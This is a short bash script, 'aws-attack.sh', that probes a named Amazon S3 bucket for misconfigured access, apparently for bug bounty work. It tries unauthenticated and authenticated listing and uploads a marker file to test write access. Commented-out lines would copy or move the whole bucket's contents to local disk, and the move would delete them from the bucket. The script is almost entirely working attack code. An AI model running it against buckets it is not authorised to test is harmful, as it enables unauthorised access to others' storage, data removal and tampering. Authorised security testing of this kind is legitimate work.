#!/bin/bash

if ! [[ ${1} ]];then
	echo -e "\n[!]\tUsage : ./aws-attack.sh S3_Bucket_Name\n"
	exit
fi

echo -e "\n[+] Trying unauthenticated listing\n"
aws s3 ls s3://"${1}" 

#echo -e "\n[+] Trying unauthenticated read\n"
#aws s3 --no-sign-request --recursive cp s3://"${1}"/ ${1}
#aws s3 --no-sign-request --recursive mv s3://"${1}"/ ${1}

echo -e "\n[+] Trying unauthenticated write\n"
echo "Uploaded by bug_bunny as a PoC for bounty" > test.txt
aws s3 --no-sign-request cp test.txt s3://"${1}"/Just_A_Test.txt
echo "Uploaded by bug_bunny as a PoC for bounty" > test.txt
aws s3 --no-sign-request mv test.txt s3://"${1}"/Just_A_Test.txt

echo -e "\n[+] Trying authenticated listing\n"
aws s3 --profile myprofile ls s3://"${1}" 

#echo -e "\n[+] Trying authenticated read\n"
#aws s3 --profile myprofile cp s3://"${1}"/ ${1}
#aws s3 --profile myprofile mv s3://"${1}"/ ${1}


echo -e "\n[+] Trying authenticated write\n"
echo "Uploaded by bug_bunny as a PoC for bounty" > test.txt
aws s3 --profile myprofile cp test.txt s3://"${1}"/Just_A_Test.txt
echo "Uploaded by bug_bunny as a PoC for bounty" > test.txt
aws s3 --profile myprofile mv test.txt s3://"${1}"/Just_A_Test.txt
